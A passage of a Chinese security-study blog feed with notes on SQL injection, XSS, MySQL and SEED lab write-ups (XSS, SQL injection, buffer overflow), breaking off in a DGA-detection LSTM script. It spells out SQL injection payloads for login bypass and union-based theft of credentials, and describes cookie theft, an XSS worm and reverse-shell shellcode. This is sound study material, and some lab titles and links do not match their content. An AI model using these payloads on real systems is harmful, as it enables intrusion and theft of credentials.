        <content type="html"><![CDATA[<p>参考文章：<a href="https://blog.csdn.net/yujia_666/article/details/90296495">SQL注入原理</a></p><h1 id="一-SQL注入概述"><a href="#一-SQL注入概述" class="headerlink" title="一. SQL注入概述"></a>一. SQL注入概述</h1><p>直接原因是没有对用户输入做检查，导致用户输入恶意SQL语句。<br>根本原因是违反数据和代码分离的设计原则，将用户恶意输入当做代码进行执行。</p><p>有以下解决方案：</p><ul><li>输入检查</li><li>预编译</li></ul><p>其中预编译符合数据和代码分离的原则，提前为输入数据提供类型，编译时为数据部分预留空间。这样用户输入智能为某一数据类型，就解决了这个问题。</p><p>数据和代码分离原则，先用一个数据类型接收用户输入，再用代码操纵这个数据类型。预编译是一种实现方式。</p><h1 id="二-SQL注入实例"><a href="#二-SQL注入实例" class="headerlink" title="二. SQL注入实例"></a>二. SQL注入实例</h1><h2 id="情景一：输入账号，密码登录"><a href="#情景一：输入账号，密码登录" class="headerlink" title="情景一：输入账号，密码登录"></a>情景一：输入账号，密码登录</h2><h3 id="后端查询语句："><a href="#后端查询语句：" class="headerlink" title="后端查询语句："></a>后端查询语句：</h3><p>*一般来说<code>#&#123;&#125;</code>这种形式是进行预编译的，而<code>&#123;&#123;&#125;&#125;</code>则没有。</p><p>查询语句：</p><p><code>select * from user where username=&#39;&#123;&#123;&#125;&#125;&#39; and password=&#39;&#123;&#123;&#125;&#125;&#39;</code></p><p>后端代码：</p><pre><code>if affect_row==1:    return &quot;succeed&quot;else:    return &quot;fail&quot;</code></pre><h3 id="SQL万能密码："><a href="#SQL万能密码：" class="headerlink" title="SQL万能密码："></a>SQL万能密码：</h3><p>如果用户名和密码都是字符类型：</p><p>输入：</p><p><em><strong>?username&#x3D;xxx’ or ‘1’&#x3D;’1&amp;password&#x3D;xxx’ or ‘1’&#x3D;’1</strong></em></p><p>后端执行语句：</p><p><code>select * from users where username=&#39;xxx&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;xxx&#39; or &#39;1&#39;=&#39;1&#39;;</code></p><p>输入：</p><p><em><strong>?username&#x3D;xxx’ or 1&#x3D;1;#&amp;password&#x3D;xxx</strong></em></p><p>后端执行语句：</p><p><code>select * from users where username=&#39;xxx&#39; or 1=1;#&#39; and password=&#39;xxx&#39;;</code></p><p>如果是数字类型：</p><p>把 <em><strong>‘</strong></em> 去掉就行。</p><h2 id="情景二：根据id查询xxx信息"><a href="#情景二：根据id查询xxx信息" class="headerlink" title="情景二：根据id查询xxx信息"></a>情景二：根据id查询xxx信息</h2><p>这里举一个根据id查找用户信息的例子。</p><p>查询语句：</p><p><code>select xxx from user where id=&#123;&#123;&#125;&#125;</code> </p><p>后端代码：</p><pre><code>    @Select(&quot;select * from user where id = &#123;&#123;id&#125;&#125;&quot;)    public User getInfo(int id);    user = new User();    user = getInfo(id);    return &quot;用户名：&quot;+username+ &#39;\n&#39; +&quot;密码：&quot;+password;</code></pre><h3 id="2-order-by-测试"><a href="#2-order-by-测试" class="headerlink" title="2. order by 测试"></a>2. order by 测试</h3><p>判断查询列数：</p><p>输入：<code>?id=1 order by 1</code></p><p>输入：<code>?id=1 order by 2</code></p><p>输入：<code>?id=1 order by ...</code></p><p>确定查询列数为三，回显为后面两列内容</p><p><code>?id=-1 union select 1,2,3 </code></p><h3 id="3-union-联合查询"><a href="#3-union-联合查询" class="headerlink" title="3. union 联合查询"></a>3. union 联合查询</h3><p><em><code>@@version_compile_os</code>：查询操作系统版本</em></p><p><em><code>version()</code>：查询数据库版本</em></p><p><em><code>user()</code>：查询当前连接数据库的用户</em></p><p><em><code>database()</code>：查询当前使用的数据库</em></p><p>当前数据库：<br><code>SELECT schema_nameFROM information_schema.schemata;</code><br><code>?id=-1 union select 1,database(),3</code></p><p>当前表：<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#39;dvwa&#39;</code></p><p>表字段：<br><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;</code></p><p>尝试注入：<br><code>?id=-1 union select 1,group_concat(username),group_cocat(password) from users</code></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全：信息收集</title>
      <link href="/posts/web_information/"/>
      <url>/posts/web_information/</url>
      
        <content type="html"><![CDATA[<p>深信服考试学习笔记</p><h1 id="一-概述"><a href="#一-概述" class="headerlink" title="一. 概述"></a>一. 概述</h1><p>信息收集是Web渗透的第一步，主要工作是摸清对方资产。</p><ul><li>DNS记录</li><li>子域名：Subdomain</li><li>邮箱</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发：MySQL</title>
      <link href="/posts/web_mysql/"/>
      <url>/posts/web_mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="一-MySQL概述"><a href="#一-MySQL概述" class="headerlink" title="一. MySQL概述"></a>一. MySQL概述</h1><h2 id="MySQL启动-终止"><a href="#MySQL启动-终止" class="headerlink" title="MySQL启动&amp;终止"></a>MySQL启动&amp;终止</h2><h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><p><code>net start mysql</code></p><h3 id="终止服务"><a href="#终止服务" class="headerlink" title="终止服务"></a>终止服务</h3><p><code>net stop mysql</code></p><h3 id="登录："><a href="#登录：" class="headerlink" title="登录："></a>登录：</h3><p><em>如果找不到环境变量（路径），则在SQL文件的bin目录下</em></p><p><em>启动不成功也可能是mysql服务没开</em></p><p><code>mysql -u root -p</code></p><h2 id="MySQL操作语言"><a href="#MySQL操作语言" class="headerlink" title="MySQL操作语言"></a>MySQL操作语言</h2><h3 id="数据库："><a href="#数据库：" class="headerlink" title="数据库："></a>数据库：</h3><p><code>show databases</code></p><p><code>use xxx</code></p><p><code>show tables</code></p><h3 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h3><p><code>select * from table</code></p><h3 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h3><p><code>insert into table values(int,&quot;str&quot;)</code></p><h3 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h3><p><code>delete from table where id=int</code></p><h3 id="改："><a href="#改：" class="headerlink" title="改："></a>改：</h3><p><code>update table set col=&quot;xxx&quot; where id=int</code></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web开发 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全-XSS</title>
      <link href="/posts/web_xss/"/>
      <url>/posts/web_xss/</url>
      
        <content type="html"><![CDATA[<h1 id="一-XSS"><a href="#一-XSS" class="headerlink" title="一. XSS"></a>一. XSS</h1><h2 id="1-反射-DOM"><a href="#1-反射-DOM" class="headerlink" title="1. 反射&amp;DOM"></a>1. 反射&amp;DOM</h2><h2 id="2-存储"><a href="#2-存储" class="headerlink" title="2. 存储"></a>2. 存储</h2>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> Web </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：XSS</title>
      <link href="/posts/seed_xss/"/>
      <url>/posts/seed_xss/</url>
      
        <content type="html"><![CDATA[<p><em>你可以到SEED官网获取实验资料：<a href="https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Server/">Buffer-Overflow Attack Lab (Server Version)</a></em>                                   </p><h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p>……</p><h1 id="实验概述"><a href="#实验概述" class="headerlink" title="实验概述"></a>实验概述</h1><ol><li>   实验环境设置</li></ol><ol><li><p>   DNS设置：<br>使用命令sudo vim &#x2F;etc&#x2F;hosts编辑本地DNS配置，需要注意的是多个域名是可以定向到同一个IP地址的，因为Web服务器可以通过HTTP协议的hosts字段来区分访问的服务。</p></li><li><p>   启动docker服务：<br>使用命令dcbuild和dcup启动docker配置的服务，一般来说docker启动服务没有什么问题，以下是服务成功启动的截图：</p></li><li><p>   准备工具“HTTP Header Live”：</p></li></ol><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><ol start="2"><li>   在浏览器提示框发布恶意消息<br>使用Java Script代码写一段这样的功能很简单：</li></ol><p>alert(‘XSS’);是JS代码部分，script标签在html中声明这是一段JS代码。<br>另外，这当代码过长时可以使用链接的方法方法，将指定路径的JS代码记载执行：</p><p>下面需要将这段恶意js代码注入到该网站中，登录samy的账号，在个人资料中的“brief description”中进行注入：</p><p>点击保存，Web服务器会将你的个人资料或者说恶意JS代码存入数据库。当请求该页面的资源时，浏览器获取到数据库中的恶意JS代码并执行。因此所有人访问这个页面都会受到影响，弹出提示框：</p><p>登录其他人的账号访问也是一样的。</p><ol start="3"><li>   显示cookie的提示框<br>相比上一个任务并没有多大改变：</li></ol><p>alert(document.cookie);这一段JS代码调用document.cookie函数获取用户cookie信息并弹出提示框进行显示，同样script标签用于在html页面中声明这是一段JS代码。<br>登录samy账号，将这段JS代码注入到个人资料中的“location”中：</p><p>点击保存后，JS代码注入成功，先弹出一个提示框“XSS”，然后弹出一个用户cookie信息：</p><p>其他人访问也是一样的：</p><p>可以通过检查网页html查看注入的JS代码，可以发现JS代码已经注入了：</p><ol start="4"><li>   窃取访问者浏览器上的Cookie<br>相比于上面的任务，这个任务具有了攻击性，窃取别人的cookie在一些场景可以绕过登录验证操作别人的账号。<br>实现原理也很简单，通过浏览器获取用户cookie然后将cookie信息发送给自己。</li></ol><p>通过document.write函数向网页中写入一个img标签，浏览器解析这个标签时会向src字段的网址发送GET请求用于获取图片资源，通过img标签我们可以向自己的IP发送一个GET请求并带上cookie参数（？后面是参数内容，这里使用“c”进行简写了）。<br>讲这段JS代码注入到个人资料中的“brief description”中：</p><p>保存之后，页面刷新可以看到后台监听到了JS代码发送的请求：</p><p>其他用户访问也是一样，这里省略。<br>可以通过检查，查看网页元素，看看我们是否注入成功：</p><ol start="5"><li>   成为受害者的好友<br>相比于上面窃取cookie，使用JS调用Web服务的接口要复杂一些。因为编写JS代码之前，需要先知道接口的详细信息，以便可以构造正确的请求。</li></ol><ol><li><p>   抓包找到添加好友的接口和参数信息。<br>这里通过“HTTP Header Live”捕获到一些信息。<br>接口：GET <a href="http://www.seed-server.com/action/friends/add">http://www.seed-server.com/action/friends/add</a><br>参数：friend&#x3D;59;__elgg_ts和_elgg_token。其实我们猜测以下就可以知道samy的id为59，另外ts应该是时间戳，token一般是用户令牌，令牌提供访问控制相关的实现，时间戳应该用于防止用户重放。</p></li><li><p>   编写JS代码并注入<br>window.onload &#x3D; function () { … }：这是一个事件处理器，表示在页面加载完成后执行指定的函数。函数定义了请求接口：URL（…&#x2F;action&#x2F;friend&#x2F;add）和HTTP方法（GET），此外一个请求参数friend也被定义到了url里，这是samy的标识，另外ts和token参数也被赋值。最后通过Ajax发送这个请求。<br>（这里代码接口错了）</p></li></ol><p>寻找合适的注入点，将JS代码注入samy个人资料的“关于我”中。这样其他人访问这个页面，他的浏览器就会执行网页中的JS代码，导致用户添加samy为好友了。<br>需要注意的是这里需要启用HTML编辑模式，否则服务器将会使用一些html标签打乱你的JS代码，导致JS代码变成文本而非代码。</p><p>登录alice账号进行测试，可以看到添加好友成功：</p><p>问题一：为什么需要代码中被标注行<br>其实就是用户令牌，后端用来识别是那一个用户发起请求的，一般用来做访问控制，ts是时间戳，用于抗用户重放。<br>问题二：不更改“关于我”编辑模型，还能注入吗？<br>不能，因为文本编辑后，JS代码将会被注入html标签，导致JS代码无法执行，因为它们会被当成文本而非代码。<br>6.修改受害者的个人资料<br>思路和上一题一样，也是先找接口，然后编写JS代码注入网页中。<br>1)抓包找到修改个人资料的接口<br>接口：POST <a href="http://www.seed-server.com/action/profile/edit">http://www.seed-server.com/action/profile/edit</a><br>接口参数：除了基本每个请求都有的ts和token以外，还有一些用户相关的参数。</p><p>这里可以通过浏览器检查中的网络查看更详细的信息：</p><ol start="2"><li><p>   编写代码并注入：<br>通过上面收集到的接口信息构造JS代码，发送一个POST请求进行更改用户发个人资料信息：</p></li><li><p>   测试是否注入成功：<br>可以通过浏览器检查功能，查看网页元素信息看是否正常注入：</p></li></ol><p>登录Alice的账号进行测试，发现当alice访问samy的个人资料界面以后，alice个人资料界面改变：</p><ol start="4"><li>   问题3：为什么需要标注的那一行：<br>这行代码用于判断用户是不是samy本身，如果不是，才选择发送POST请求修改个人资料中的关于我信息。</li></ol><ol start="7"><li>   编写能自我传播的XSS蠕虫<br>上面的任务将恶意信息注入别人的个人资料中，这里只需要将恶意JS代码也一起注入即可。<br>编写JS代码，下面这段代码会自动将JS代码嵌入html中，因此用户访问页面后，会被感染从而感染更多的人，造成传播。</li></ol><p>将JS代码注入到samy的个人资料“关于我”中：</p><p>登录其他账号检测是否注入成功：</p><p>防御策略：使用一些转编码的方式让嵌入的script标签和其他html标签失效。<br>8.使用CSP策略对抗攻击<br>网页文件使用JS代码有两种方式，内联方式和链接方式。内联方式是造成XSS注入的罪魁祸首，因为它可能允许用户输入JS代码进行执行；链接的方式则允许浏览器使用可信来源的JS文件。总的来说，链接的方式使得html元素和JS代码相分离。<br>通过CSP策略，只有可信来源（同域）的JS文件，包括其他资源比如图片等。<br>问题一：<br>下面三个网站采用了不同的CSP策略，这里有选项链接，内联，还有不同的域，三个网站CSP策略不同。</p><p>问题二：<br>点击按钮，只有“32a”网站作出响应。<br>问题三：<br>在配置中按照70添加一行60的就行：</p><p>这里重新启动docker生效：</p><p>问题四：<br>这里方法差不多，不过是使用php对index页面进行配置：</p><p>配置成功：</p><p>问题五：<br>禁止内联JS代码。<br>对于链接JS文件限制可信源。<br>另外还可以通过connect-src和frame-src限制资源来源和目标，防止数据泄漏。</p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SEED </tag>
            
            <tag> Web </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：SQL Injection Attack Lab</title>
      <link href="/posts/seed_sql/"/>
      <url>/posts/seed_sql/</url>
      
        <content type="html"><![CDATA[<p><em>你可以到SEED官网获取实验资料：<a href="https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Server/">Buffer-Overflow Attack Lab (Server Version)</a></em>                                   </p><h1 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h1><p>…….<br>一、作业题目<br>SQL注入实验<br>二、实验步骤及结果<br>1.实验环境<br>拓扑结构<br>本次实验镜像有两个容器，其中一个是Web服务器，另外一个则用于托管Web程序的数据库。</p><p>Web服务器的IP地址为：10.9.0.5</p><p>域名：<br>Web服务的URL地址为：<a href="http://www.seed-server.com/">http://www.seed-server.com</a></p><p>为了确保这个URL地址能够被解析，你需要查看&#x2F;etc&#x2F;hosts文件，确保该URL条目绑定Web服务器IP地址。如果不是，使用root权限修改这个条目。</p><p>MySQL数据库：<br>数据库服务器的IP地址为：10.9.0.6</p><p>Web应用程序：<br>这是一个简单的员工管理应用程序。员工可以通过此web应用程序查看和更新数据库中的个人信息。该web应用程序主要有两个角色：管理员是一个特权角色，可以管理每个员工的个人资料信息；员工是一个正常的角色，可以查看或更新他&#x2F;她自己的个人资料信息。所有员工信息如表1所示。<br>2.熟悉SQL语句<br>在SQL服务器已经创建了一个名为sqllab-users的数据库，其中包含一个称为credential的表。该表存储每个员工的个人信息（如eid、密码、工资、ssn等）。操作该数据库进行练习。</p><p>首先进入到SQL服务器：</p><p>连接一个MySQL服务：</p><p>使用某个数据库，需要注意的是SQL语句通常情况下需要分号“;”结束：</p><p>发现数据库虽然存在，但是没有表和数据，查看容器启动信息，发现容器对于sqllab_users.sql文件权限被拒绝，向该文件添加可执行权限，虽然容器启动没有警告了，但是数据库依然没有内容。</p><p>将sql文件复制到容器：</p><p>……</p><p>然后搞定了<br>查询alice的所有信息：<br>在前面已经知道表的结构和数据，因此根据id查询Alice的信息即可：</p><p>下面发现镜像文件有问题，容器启动后web服务器无法工作<br>3.基于SELECT的SQL注入<br>使用<a href="http://www.seed-server.com的登录页面执行此任务.登录页面要求用户提供用户名和密码.web应用程序根据这两条数据对用户进行身份验证,因此只有知道其密码的员工才能登录.作为攻击者,您的工作是在不知道任何员工凭据的情况下登录web应用程序./">www.seed-server.com的登录页面执行此任务。登录页面要求用户提供用户名和密码。web应用程序根据这两条数据对用户进行身份验证，因此只有知道其密码的员工才能登录。作为攻击者，您的工作是在不知道任何员工凭据的情况下登录web应用程序。</a></p><p>以下内容展示了Web服务器如何对账号密码进行验证：</p><p>可以看到后端通过GET方法获取参数username和password这代表大概率可以直接在URL中键入SQL注入的语句。<br>验证的思路是是否查询到数据库中是否有条目满足账号密码都等于用户的输入。<br>1)从网页进行SQL注入<br>网页上的账号密码表单在点击提交以后，通过http协议传输到后端，后端解析账号密码参数时进行注入。</p><p>一般的账号密码验证都是通过数据库语句返回条件情况进行判断，构造下面输入：<br>（这里“单引号”是因为用户名是字符串类型）</p><p>那么数据库执行语句为：</p><p>这条语句使得登录验证的逻辑始终为真，后端程序误以为登录验证为真，使得用户直接绕过登录验证。<br>2)从命令行进行SQL注入<br>这里只需要在请求URL中构造下面命令即可，参数会被自动带入后端程序进行执行，注意需要对字符进行URL编码。</p><p>使用“curl”运行下面命令即可：<br>（或者直接在地址栏中输入相应的内容也可以）</p><ol start="3"><li>   添加一条新的SQL语句<br>如果需要执行其他语句，首先想到联合查询和“分号”。</li></ol><p>如果联合查询让前一个查询条件失效，那么便可以随便构造SQL语句进行执行。</p><p>对于“分号”，那么数据库会执行后面的SQL语句。</p><p>通过“分号”构造下面语句，同时注释后面的内容：</p><p>但是这里数据库并不允许同时运行多条SQL语句。<br>4.基于UPDATE的SQL注入<br>相比于“SELECT”语句的注入，UPDATE注入语句可能更加危险，因为可以允许直接修改数据库信息。<br>1)修改自己的工资<br>这里不允许修改工资选项，但是SQL语句是这样：</p><p>只需要选择nickname作为注入点，然后附带需要修改的信息，这样薪水修改部分就可以被附加执行了：</p><ol start="2"><li><p>   修改其他人的工资<br>这个问题其实和上面的思路一致，需要设置ID为boby的数字，同时注释后面部分：</p></li><li><p>   修改其他人的密码<br>这里密码会经过hash以后存储到数据库中，因此构造注入语句时需要注入hash以后的密码：</p></li></ol><ol start="5"><li>   应对策略-预编译<br>SQL注入的根本原因是违背了“数据和代码隔离”的原则，对于用户的输入并没有限制在数据水平。预编译可以有效解决这个问题，当SQL语句被执行预编译以后，只会保留未被填入的数据部分，攻击者无法再更改SQL注入语句的结构，智能填入对应类型的数据，从而有效避免这类攻击。</li></ol><ol><li>   改修复Web应用SQL漏洞<br>在index页面中键入的数据将被发送到服务器程序unsafe.php，这是一个不安全的程序，对SQL注入攻击没有防御机制。</li></ol><p>现在新建一个safe.php文件修复该漏洞，同时将index中的链接指向该程序此php程序即可（unsafe.php程序位于image_www&#x2F;Code&#x2F;adefense文件夹中；同时可能需要重启容器以更新配置）。</p><p>主要更改SQL语句部分，增加预编译的逻辑：</p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEED </tag>
            
            <tag> SQL Injection Attack Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：Environment Variable and Set-UID Program Lab</title>
      <link href="/posts/seed_setuid/"/>
      <url>/posts/seed_setuid/</url>
      
        <content type="html"><![CDATA[<h1 id="Environment-Variable-and-Set-UID-Program-Lab"><a href="#Environment-Variable-and-Set-UID-Program-Lab" class="headerlink" title="Environment Variable and Set-UID Program Lab"></a>Environment Variable and Set-UID Program Lab</h1><h2 id="1-Task1-Get-Familiar-with-the-Shellcode"><a href="#1-Task1-Get-Familiar-with-the-Shellcode" class="headerlink" title="1. Task1 Get Familiar with the Shellcode"></a>1. Task1 Get Familiar with the Shellcode</h2><h3 id="修改shellcode-32-py文件，使其能够删除文件。"><a href="#修改shellcode-32-py文件，使其能够删除文件。" class="headerlink" title="修改shellcode_32.py文件，使其能够删除文件。"></a>修改shellcode_32.py文件，使其能够删除文件。</h3><p> <img src="/img/os_stackoverflow/image.png" alt="Alt text"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>在该目录下创建文件task1，通过ls命令发现task1文件创建成功。<br> <img src="/img/os_stackoverflow/image-1.png" alt="Alt text"><br>可以看到执行a32.out文件后，通过ls命令发现task1文件被删除。<br> <img src="/img/os_stackoverflow/image-2.png" alt="Alt text"></p><h2 id="2-Task2-Level-1-Attack"><a href="#2-Task2-Level-1-Attack" class="headerlink" title="2. Task2 Level-1 Attack"></a>2. Task2 Level-1 Attack</h2><h3 id="attack-code传入hello，获取server的堆栈信息。"><a href="#attack-code传入hello，获取server的堆栈信息。" class="headerlink" title="attack-code传入hello，获取server的堆栈信息。"></a>attack-code传入hello，获取server的堆栈信息。</h3><p> <img src="/img/os_stackoverflow/image-3.png" alt="Alt text"><br>Buf基地址为：0xffffd598<br>Ebp地址为：0xffffd608</p><h3 id="编写exploit-py文件。"><a href="#编写exploit-py文件。" class="headerlink" title="编写exploit.py文件。"></a>编写exploit.py文件。</h3><p>在32位环境下，ret地址为ebp地址+4（单位为字节），已知buf基地址，则偏移量为ebp地址+4-buf基地址。<br>ret的值存储指令地址，要执行shellcode，因此要将ret指向shellcode地址。而shellcode使用了Nop填充，所以ret指向ret+4即可空转跳转到shellcode。<br><img src="/img/os_stackoverflow/image-4.png" alt="Alt text"></p><h3 id="生成badfile，获取服务器权限"><a href="#生成badfile，获取服务器权限" class="headerlink" title="生成badfile，获取服务器权限"></a>生成badfile，获取服务器权限</h3><p> <img src="/img/os_stackoverflow/image-5.png" alt="Alt text"><br>3. Task3 Level-2 Attack</p><h3 id="attack-code传入hello，获取server堆栈信息。"><a href="#attack-code传入hello，获取server堆栈信息。" class="headerlink" title="attack-code传入hello，获取server堆栈信息。"></a>attack-code传入hello，获取server堆栈信息。</h3><p> <img src="/img/os_stackoverflow/image-6.png" alt="Alt text"><br>Buf基地址：0xffffd548<br>Ebp地址：由于buf大小在100-300字节，因此ebp地址在buf基地址+100到buf基地址+300之间。</p><h3 id="编写exploit-py文件。-1"><a href="#编写exploit-py文件。-1" class="headerlink" title="编写exploit.py文件。"></a>编写exploit.py文件。</h3><p>Ret地址等于ebp地址+4，因此ret地址可能在buf基地址+104到buf基地址+304之间，所以offset的值可能在104到304之间。将这段content都填入ret指向地址即可。<br>Ret的值需要指向shellcode，而buf大小不确定，因此ret指向地址必须大于buf最大值+8，以执行ret上方的shellcode，避免从下面空转到ret陷入循环。<br> <img src="/img/os_stackoverflow/image-7.png" alt="Alt text"></p><h3 id="生成badfile，获取服务器权限。"><a href="#生成badfile，获取服务器权限。" class="headerlink" title="生成badfile，获取服务器权限。"></a>生成badfile，获取服务器权限。</h3><h2 id="4-Task4-Level-3-Attack"><a href="#4-Task4-Level-3-Attack" class="headerlink" title="4. Task4 Level-3 Attack"></a>4. Task4 Level-3 Attack</h2><h3 id="attack-code传入hello获取server堆栈信息。"><a href="#attack-code传入hello获取server堆栈信息。" class="headerlink" title="attack-code传入hello获取server堆栈信息。"></a>attack-code传入hello获取server堆栈信息。</h3><p> <img src="/img/os_stackoverflow/image-8.png" alt="Alt text"><br>Rbp指针：0x00007fffffffe540<br>Buf基地址：0x00007fffffffe470</p><h3 id="编写exploit-py文件。-2"><a href="#编写exploit-py文件。-2" class="headerlink" title="编写exploit.py文件。"></a>编写exploit.py文件。</h3><p>首先插入64位的shellcode，并把执行命令改为反弹shell。<br>start的值设置为0，此时shellcode在content头部，位置为content[0,len(shellcode)]。<br>Ret地址为rbp地址+8（64位环境），offset的值为ret地址-buf基地址。<br>ret的值指向shellcode地址，此时shellcode代码在content头部，即buf基地址0x470。<br> <img src="/img/os_stackoverflow/image-9.png" alt="Alt text"></p><h3 id="生成badfile，获取服务器权限-1"><a href="#生成badfile，获取服务器权限-1" class="headerlink" title="生成badfile，获取服务器权限"></a>生成badfile，获取服务器权限</h3><p> <img src="/img/os_stackoverflow/image-10.png" alt="Alt text"></p><h2 id="5-Task5-Level-4-Attack"><a href="#5-Task5-Level-4-Attack" class="headerlink" title="5. Task5 Level-4 Attack"></a>5. Task5 Level-4 Attack</h2><h3 id="attack-code传入hello，获取server堆栈信息。-1"><a href="#attack-code传入hello，获取server堆栈信息。-1" class="headerlink" title="attack-code传入hello，获取server堆栈信息。"></a>attack-code传入hello，获取server堆栈信息。</h3><p> <img src="/img/os_stackoverflow/image-11.png" alt="Alt text"><br>Rbp指针：0x00007fffffffe540<br>Buf基地址：0x00007fffffffe470</p><h3 id="编写exploit-py文件"><a href="#编写exploit-py文件" class="headerlink" title="编写exploit.py文件"></a>编写exploit.py文件</h3><p>相比于上一个task，这个task实行shellcode依靠于Return-to-libc，因此需要改变ret指向地址。<br>        经过尝试以后，ret为rbp+1400的时候能够实现反弹shell。<br><img src="/img/os_stackoverflow/image-12.png" alt="Alt text"> </p><h3 id="生成badfile，获取服务器权限。-1"><a href="#生成badfile，获取服务器权限。-1" class="headerlink" title="生成badfile，获取服务器权限。"></a>生成badfile，获取服务器权限。</h3><p> <img src="/img/os_stackoverflow/image-13.png" alt="Alt text"></p><h2 id="6-Task6-Level-5-Attack"><a href="#6-Task6-Level-5-Attack" class="headerlink" title="6. Task6 Level-5 Attack"></a>6. Task6 Level-5 Attack</h2><h3 id="打开地址随机化。"><a href="#打开地址随机化。" class="headerlink" title="打开地址随机化。"></a>打开地址随机化。</h3><p> <img src="/img/os_stackoverflow/image-14.png" alt="Alt text"></p><h3 id="attack-code传入hello，获取server堆栈信息。-2"><a href="#attack-code传入hello，获取server堆栈信息。-2" class="headerlink" title="attack-code传入hello，获取server堆栈信息。"></a>attack-code传入hello，获取server堆栈信息。</h3><p>可以发现随着地址随机化的打开，server堆栈地址发生改变。<br> <img src="/img/os_stackoverflow/image-15.png" alt="Alt text"><br> <img src="/img/os_stackoverflow/image-16.png" alt="Alt text"></p><h3 id="编写exploit-py文件。-3"><a href="#编写exploit-py文件。-3" class="headerlink" title="编写exploit.py文件。"></a>编写exploit.py文件。</h3><p> <img src="/img/os_stackoverflow/image-17.png" alt="Alt text"></p><h3 id="生成badfile，运行脚本brute-force-sh不断向server传入badfile。"><a href="#生成badfile，运行脚本brute-force-sh不断向server传入badfile。" class="headerlink" title="生成badfile，运行脚本brute-force.sh不断向server传入badfile。"></a>生成badfile，运行脚本brute-force.sh不断向server传入badfile。</h3><p>当server程序满足badfile的堆栈条件时，脚本停止，成功获取服务器权限。<br> <img src="/img/os_stackoverflow/image-18.png" alt="Alt text"><br> <img src="/img/os_stackoverflow/image-19.png" alt="Alt text"><br> <img src="/img/os_stackoverflow/image-20.png" alt="Alt text"></p><h2 id="7-Task7-Level-6-Attack"><a href="#7-Task7-Level-6-Attack" class="headerlink" title="7.Task7 Level-6 Attack"></a>7.Task7 Level-6 Attack</h2><h3 id="在server-code目录下："><a href="#在server-code目录下：" class="headerlink" title="在server-code目录下："></a>在server-code目录下：</h3><p>去除-fon-stack-protector选项（即打开栈保护机制）编译stack.c，将badfile输入。<br>Server成功检测到stack smashing（堆栈溢出漏洞）<br> <img src="/img/os_stackoverflow/image-21.png" alt="Alt text"></p><h3 id="在shellcode目录下："><a href="#在shellcode目录下：" class="headerlink" title="在shellcode目录下："></a>在shellcode目录下：</h3><p>去除-z execstack（这个选项会认为栈空间的指令可以被执行，因此我们才能之前的实验运行栈溢出的shellcode和空转指令）编译call_shellcode.c编译并运行。<br><img src="/img/os_stackoverflow/image-22.png" alt="Alt text"></p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEED </tag>
            
            <tag> Environment Variable and Set-UID Program Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dga域名检测</title>
      <link href="/posts/ml_dga/"/>
      <url>/posts/ml_dga/</url>
      
        <content type="html"><![CDATA[<h2 id="DGA域名"><a href="#DGA域名" class="headerlink" title="DGA域名"></a>DGA域名</h2><p>通过dga算法生成的域名，需要知道的是dga算法有很多分支。</p><p>在字符特征上与普通域名有一些差别，dga域名通常是一些无意义的数字和字母，而正常域名通常带有一些意义比如baidu.com（百度），另外正常域名通常有更多的元音字母，因为这让人更加容易记住和读。</p><p>不过，随着dga域名的改进（通过正常域名修改两个字母等），这些差距都可以被缩小，dga域名将会变得越来越像正常域名，这时候依靠于字符特征是难以起效了。</p><p>因此，找出dga域名更加深层的特征是必要的，dga域名通常用于黑客和僵尸网络通信，因此这将是未来一个有意义的方向。</p><p>下面，我们使用lstm检测dga域名，因为lstm相比于tf-idf和词袋模型更好的捕捉词语间的语序信息。</p><p>需要注意的是，我们训练的模型依然依靠的是dga域名的字符信息，因此这个模型具有局限性。</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><pre><code class="python"># 数据读取import pandas as pd# 数据处理from sklearn.utils import shufflefrom tensorflow.keras.preprocessing import sequenceimport numpy as np# 划分数据集from sklearn.model_selection import train_test_split# 模型构建from keras.models import Sequentialfrom keras.layers import Dense, LSTM# 加载模型from keras.models import load_modeldef read_dga(file_path):    with open(file_path, &#39;r&#39;) as f:        lines = f.readlines()[18:1324316]    dga_list = 